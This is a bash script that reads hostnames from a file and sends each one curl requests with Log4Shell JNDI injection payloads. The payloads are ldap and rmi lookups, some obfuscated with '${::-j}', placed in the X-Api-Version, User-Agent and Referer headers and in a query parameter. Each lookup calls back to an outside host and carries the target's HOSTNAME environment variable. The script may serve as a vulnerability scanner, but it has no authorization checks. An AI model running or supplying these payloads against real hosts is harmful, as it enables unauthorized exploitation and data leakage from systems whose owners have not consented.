#!/bin/bash

function scan () {
  # debug(X-Api-Version Header)
  echo "$1 $2"
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$LDAP/$2/$3/\${env:HOSTNAME}}'|g"       | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${\${::-j}ndi:rmi://$LDAP/$2/$3/\${env:HOSTNAME}}'|g" | sed "s|\$1|$1|g" | bash

  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$LDAP/$2/$3/\${env:HOSTNAME}}'|g"       | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$LDAP/$2/$3/\${env:HOSTNAME}}'|g" | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${jndi:ldap://$LDAP/$2/$3/\${env:HOSTNAME}}'|g"          | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$LDAP/$2/$3/\${env:HOSTNAME}}'|g"    | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${jndi:ldap://$LDAP/$2/$3/\${env:HOSTNAME}}}'|g"                  | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$LDAP/$2/$3/\${env:HOSTNAME}}'|g"             | sed "s|\$1|$1|g" | bash
}

while read fqdn
do
  REQUEST_UNIXTIME=`date +%s`
  TARGET=`echo "$fqdn" | sed -e "s|^https://||g" | sed -e "s|^http://||g" | sed -e "s|:.*$||g" | sed -e "s|/.*$||g"`

  # call scan
  if [[ $fqdn == "http"* ]]
  then
    scan $fqdn $TARGET $REQUEST_UNIXTIME
  else 
    scan http://$fqdn $TARGET $REQUEST_UNIXTIME
    scan https://$fqdn $TARGET $REQUEST_UNIXTIME
  fi
done < fqdn.txt
